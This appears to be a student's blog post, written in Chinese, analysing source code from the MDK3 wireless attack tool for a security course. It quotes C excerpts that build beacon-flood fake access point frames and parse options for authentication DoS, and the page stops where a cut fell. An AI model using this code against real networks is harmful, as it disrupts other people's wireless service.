@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="DazzleP" />
+
+
+
+<meta name="description" content="无线网络课的课题">
+<meta name="keywords" content="homework,code">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MDK3源码分析">
+<meta property="og:url" content="http://yoursite.com/2017/05/31/MDK3源码分析/index.html">
+<meta property="og:site_name" content="DazzleP&#39;s Blog">
+<meta property="og:description" content="无线网络课的课题">
+<meta property="og:updated_time" content="2017-05-31T15:45:00.814Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MDK3源码分析">
+<meta name="twitter:description" content="无线网络课的课题">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="DazzleP&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/avatar_maki.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>MDK3源码分析 | DazzleP&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar_maki.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">DazzleP</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">A simple record place</p>
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="/dazzlepppp@outlook.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="http://weibo.com/2722036022" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/dazzlepppp" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://iamjimyes.github.io/">p5yGho</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://blog.imspace.cn/">space</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://blog.wdeil.xyz/">wdeil</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">DazzleP</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar_maki.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">DazzleP</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">A simple record place</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="/dazzlepppp@outlook.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/2722036022" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/dazzlepppp" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-MDK3源码分析" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/05/31/MDK3源码分析/" class="article-date">
+      <time datetime="2017-05-31T15:44:08.000Z" itemprop="datePublished">2017-05-31</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MDK3源码分析
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/code/">code</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/homework/">homework</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无线网络安全课的选题，我们组选得是无线网络恶意分析，然后我们最后选择的课题是MDK3工具的利用和分析，我的部分是分析MDK3的源码<br>在这里我要吐槽一下这个代码，缩进没有层次上的区分，再加上处理参数时用了大量的if-else结构和switch case，整个代码可读性基本就是一个差字,<br>而且处理参数为何不用getopt啊。。。</p>
+<h2 id="main-函数分析"><a href="#main-函数分析" class="headerlink" title="main()函数分析"></a>main()函数分析</h2><p>大概截取一部分<code>main()</code>函数代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> (argv[<span class="number">2</span>][<span class="number">0</span>]) &#123;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_beac);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'a'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_auth);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'p'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_prob);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'d'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_deau);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'m'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_mich);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'x'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_eapo);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'w'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_wids);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'f'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_macb);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">case</span> <span class="string">'g'</span>:</div><div class="line">		<span class="built_in">printf</span>(use_wpad);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	    <span class="keyword">default</span>:</div><div class="line">		<span class="built_in">printf</span>(use_head);</div><div class="line">        &#125; </div><div class="line"></div><div class="line"><span class="comment">/* open the replay interface */</span></div><div class="line">    _wi_out = wi_open(argv[<span class="number">1</span>]);</div><div class="line">    <span class="keyword">if</span> (!_wi_out)</div><div class="line">    	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    dev.fd_out = wi_fd(_wi_out);</div><div class="line"></div><div class="line">    <span class="comment">/* open the packet source */</span></div><div class="line">    _wi_in = _wi_out;</div><div class="line">    dev.fd_in = dev.fd_out;</div><div class="line"></div><div class="line">    <span class="comment">/* XXX */</span></div><div class="line">    dev.arptype_in = dev.arptype_out;</div><div class="line"></div><div class="line">    <span class="comment">/* drop privileges */</span></div><div class="line"></div><div class="line">    setuid( getuid() );</div><div class="line"></div><div class="line">    <span class="keyword">int</span> retval = mdk_parser(argc, argv);</div><div class="line"></div><div class="line">    <span class="keyword">return</span>( retval );</div></pre></td></tr></table></figure></p>
+<p><code>main()</code>函数初步的解析了程序运行的参数，参数不对的话打出对应的help，然后传给<code>mdk_parser()</code>进行进一步处理<br>同样的截取一部分代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> (argv[<span class="number">2</span>][<span class="number">0</span>])</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">	mode = <span class="string">'b'</span>;</div><div class="line">	usespeed = <span class="number">1</span>;</div><div class="line">	<span class="keyword">for</span> (t=<span class="number">3</span>; t&lt;argc; t++)</div><div class="line">	&#123;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-n"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) ssid = argv[t+<span class="number">1</span>];</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-f"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (ssid_file_name == <span class="literal">NULL</span>) ssid_file_name = argv[t+<span class="number">1</span>];</div><div class="line">		<span class="keyword">else</span> &#123; <span class="built_in">printf</span>(use_beac); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-v"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (ssid_file_name == <span class="literal">NULL</span>) &#123; ssid_file_name = argv[t+<span class="number">1</span>]; adv=<span class="number">1</span>; &#125;</div><div class="line">		<span class="keyword">else</span> &#123; <span class="built_in">printf</span>(use_beac); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-s"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) pps = strtol(argv[t+<span class="number">1</span>], (<span class="keyword">char</span> **) <span class="literal">NULL</span>, <span class="number">10</span>);</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-c"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) fchan = strtol(argv[t+<span class="number">1</span>], (<span class="keyword">char</span> **) <span class="literal">NULL</span>, <span class="number">10</span>);</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-h"</span>)) mode = <span class="string">'B'</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-m"</span>)) random_mac = <span class="number">0</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-w"</span>)) wep = <span class="number">1</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-g"</span>)) gmode = <span class="number">1</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-t"</span>)) wep = <span class="number">2</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-a"</span>)) wep = <span class="number">3</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-d"</span>)) adhoc = <span class="number">1</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>getopt到底有啥不好的。。。非得这么麻烦<br>这里mode为b时使用的是beacon模式，用起来就是同时产生大量的fake ap，干扰用户的正常通信<br>这个工具还有强制认证解除模式，验证请求DOS攻击，探测AP爆破ESSID等，之后再讲</p>
+<h2 id="Beacon模式"><a href="#Beacon模式" class="headerlink" title="Beacon模式"></a>Beacon模式</h2><p><code>parser()</code>函数对该模式的处理<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'B'</span>:</div><div class="line">	    <span class="keyword">if</span> ((nb_sent % <span class="number">30</span> == <span class="number">0</span>) || (total_time % <span class="number">3</span> == <span class="number">0</span>))  <span class="comment">// Switch Channel every 30 frames or 3 seconds</span></div><div class="line">	    &#123;</div><div class="line">		<span class="keyword">if</span> (fchan) &#123;</div><div class="line">		    set_channel(fchan);</div><div class="line">		    chan = fchan;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">		    chan = generate_channel();</div><div class="line">		    set_channel(chan);</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">	    frm = create_beacon_frame(ssid, chan, wep, random_mac, gmode, adhoc, adv);</div><div class="line">	    <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">	    <span class="keyword">if</span> (fchan) chan = fchan;</div><div class="line">		<span class="keyword">else</span> chan = generate_channel();</div><div class="line">	    frm = create_beacon_frame(ssid, chan, wep, random_mac, gmode, adhoc, adv);</div><div class="line">	    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
+<p>大写的B就是指定特定信道的时候用，我们来看一下<code>create_beacon_frame()</code>函数用到的几个变量<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">  <span class="keyword">char</span> *hdr =	<span class="string">"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"</span></div><div class="line"><span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span></div><div class="line"><span class="string">"\x64\x00\x05\x00\x00"</span>;</div><div class="line">  <span class="keyword">char</span> *param2 = <span class="string">"\x04\x06\x01\x02\x00\x00\x00\x00\x05\x04\x00\x01\x00\x00"</span>;</div><div class="line">  <span class="comment">//WPA-TKIP Tag</span></div><div class="line">  <span class="keyword">char</span> *wpatkip = <span class="string">"\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x00\x00"</span>;</div><div class="line">  <span class="comment">//WPA-AES Tag</span></div><div class="line">  <span class="keyword">char</span> *wpaaes = <span class="string">"\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x02\x00\x00"</span>;</div></pre></td></tr></table></figure></p>
+<p>这些数据视情况写到要发送的数据包里面<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(gmode) &#123;</div><div class="line">	<span class="comment">//1-54 Mbit</span></div><div class="line">	<span class="built_in">memcpy</span>(&amp;param1, <span class="string">"\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c\x03\x01"</span>, <span class="number">12</span>);</div><div class="line">	modelen = <span class="number">12</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">	<span class="comment">//1-11 Mbit</span></div><div class="line">	<span class="built_in">memcpy</span>(&amp;param1, <span class="string">"\x01\x04\x82\x84\x8b\x96\x03\x01"</span>, <span class="number">8</span>);</div><div class="line">	modelen = <span class="number">8</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>这里根据是否使用54Mbit模式向param1写入不同信息，最后param1会写入要发送的数据包中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Getting SSID from file if file mode is in use</span></div><div class="line">    <span class="keyword">if</span> (advanced) &#123;</div><div class="line">	ssid = fakeap.ssid;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">if</span> (!(ssid_file_name == <span class="literal">NULL</span>)) ssid = read_line_from_file();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//Need to generate SSID or is one given?</span></div><div class="line">    <span class="keyword">if</span> (ssid == <span class="literal">NULL</span>) ssid = generate_ssid();</div><div class="line">    slen = <span class="built_in">strlen</span>(ssid);</div><div class="line">    <span class="comment">//Checking SSID lenght</span></div><div class="line">    <span class="keyword">if</span> (slen&gt;<span class="number">32</span> &amp;&amp; showssidwarn1) &#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"\rWARNING! Sending non-standard SSID &gt; 32 bytes\n"</span>);</div><div class="line">	showssidwarn1 = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (slen&gt;<span class="number">255</span>) &#123;</div><div class="line">	<span class="keyword">if</span> (showssidwarn2) &#123;</div><div class="line">	    <span class="built_in">printf</span>(<span class="string">"\rWARNING! Truncating overlenght SSID to 255 bytes!\n"</span>);</div><div class="line">	    showssidwarn2 = <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	slen = <span class="number">255</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>这里是生成fake ap的SSID，如果有指定就从文件中读取，如果没有就使用<code>generate_ssid()</code>函数随机生成，之后进行SSID合法性检查<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Setting up header</div><div class="line">    memcpy(pkt, hdr, 36);</div><div class="line">    // Set mode and WEP bit if wanted</div><div class="line">    if(adhoc) &#123;</div><div class="line">        if(wep) pkt[34]='\x12';</div><div class="line">        else pkt[34]='\x02';</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        if(wep) pkt[34]='\x11';</div><div class="line">        else pkt[34]='\x01';</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>这里设置数据包头部，根据是否使用WEP模式来设置数据包中相应的数据<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Set random mac</span></div><div class="line">    <span class="keyword">if</span> (advanced) &#123;</div><div class="line">	mac.data = (uchar *) fakeap.mac;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">if</span> (random_mac) mac = generate_mac(<span class="number">0</span>);</div><div class="line">	    <span class="keyword">else</span> mac = generate_mac(<span class="number">2</span>);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>这里是生成fake ap的MAC，如果有指定就从文件中读取，如果没有就使用<code>generate_mac()</code>函数随机生成<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">10</span>, mac.data, ETH_MAC_LEN);</div><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">16</span>, mac.data, ETH_MAC_LEN);</div><div class="line"> <span class="comment">// Set SSID</span></div><div class="line"> pkt[<span class="number">37</span>] = (uchar) slen;</div><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">38</span>, ssid, slen);</div><div class="line"> <span class="comment">// Set Parameters 1</span></div><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">38</span>+slen, param1, modelen);</div><div class="line"> <span class="comment">// Set Channel</span></div><div class="line"> pkt[<span class="number">38</span>+slen+modelen] = chan;</div><div class="line"> <span class="comment">// Set Parameters 2</span></div><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">39</span>+slen+modelen, param2, <span class="number">14</span>);</div><div class="line"> <span class="comment">//Set WPA tag</span></div><div class="line"> <span class="keyword">if</span>(wep == <span class="number">2</span>) &#123;	<span class="comment">//If TKIP</span></div><div class="line">     <span class="built_in">memcpy</span>(pkt+<span class="number">53</span>+slen+modelen, wpatkip, <span class="number">26</span>);</div><div class="line">     modelen += <span class="number">26</span>;	<span class="comment">//Let's just reuse the variable from 'gmode'.</span></div><div class="line"> &#125;</div><div class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(wep == <span class="number">3</span>) &#123;	<span class="comment">//If AES</span></div><div class="line">     <span class="built_in">memcpy</span>(pkt+<span class="number">53</span>+slen+modelen, wpaaes, <span class="number">26</span>);</div><div class="line">     modelen += <span class="number">26</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"> retn.data = pkt;</div><div class="line"> retn.len = slen+<span class="number">53</span>+modelen;</div><div class="line"></div><div class="line"> <span class="keyword">return</span> retn;</div></pre></td></tr></table></figure></p>
+<p>设置数据包最后的容，根据需要指定加密模式，最后返回数据包给<code>parser()</code>函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Sending packet, increase counters */</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (frm.len &lt; <span class="number">10</span>) <span class="built_in">printf</span>(<span class="string">"WTF?!? Too small packet injection detected! BUG!!!\n"</span>);</div><div class="line">send_packet(frm.data, frm.len);</div><div class="line">nb_sent_ps++;</div><div class="line">nb_sent++;</div><div class="line"><span class="keyword">if</span> (useqosexploit) &#123; nb_sent_ps += <span class="number">3</span>; nb_sent += <span class="number">3</span>; &#125;	<span class="comment">//Yes, I know... too lazy.</span></div></pre></td></tr></table></figure></p>
+<p>发送数据包 </p>
+<h2 id="验证DOS攻击模式"><a href="#验证DOS攻击模式" class="headerlink" title="验证DOS攻击模式"></a>验证DOS攻击模式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'a'</span>:</div><div class="line">	mode = <span class="string">'a'</span>;</div><div class="line">	<span class="keyword">for</span> (t=<span class="number">3</span>; t&lt;argc; t++)</div><div class="line">	&#123;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-a"</span>)) &#123;</div><div class="line">		  <span class="keyword">if</span> (! argc &gt; t+<span class="number">1</span>) &#123; <span class="built_in">printf</span>(use_auth); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">		  ap = (uchar *) parse_mac(argv[t+<span class="number">1</span>]);</div><div class="line">		  mode = <span class="string">'A'</span>;</div><div class="line">	    &#125;</div><div class="line">        <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-i"</span>)) &#123;</div><div class="line">		  <span class="keyword">if</span> (! argc &gt; t+<span class="number">1</span>) &#123; <span class="built_in">printf</span>(use_auth); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">		  target = (uchar *) parse_mac(argv[t+<span class="number">1</span>]);</div><div class="line">		  mode = <span class="string">'i'</span>;</div><div class="line">		  usespeed = <span class="number">1</span>; pps = <span class="number">500</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-c"</span>)) check = <span class="number">1</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-m"</span>)) random_mac = <span class="number">0</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-s"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		pps = strtol(argv[t+<span class="number">1</span>], (<span class="keyword">char</span> **) <span class="literal">NULL</span>, <span class="number">10</span>);</div><div class="line">		usespeed = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">break</span>;</div></pre></td></tr></table></figure>
+<p>这里可以看出我们可以设置是否指定特定的AP，是否要返回测试结果，发包频率等参数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'a'</span>:  <span class="comment">// Automated Auth DoS mode</span></div><div class="line">    <span class="keyword">if</span> ((nb_sent % <span class="number">512</span> == <span class="number">0</span>) || (total_time % <span class="number">30</span> == <span class="number">0</span>))  <span class="comment">// After 512 packets or 30 seconds, search for new target</span></div><div class="line">    &#123;</div><div class="line">    <span class="built_in">printf</span> (<span class="string">"\rTrying to get a new target AP...                  \n"</span>);</div><div class="line">    ap = get_target_ap();</div><div class="line">    &#125;</div><div class="line"><span class="keyword">case</span> <span 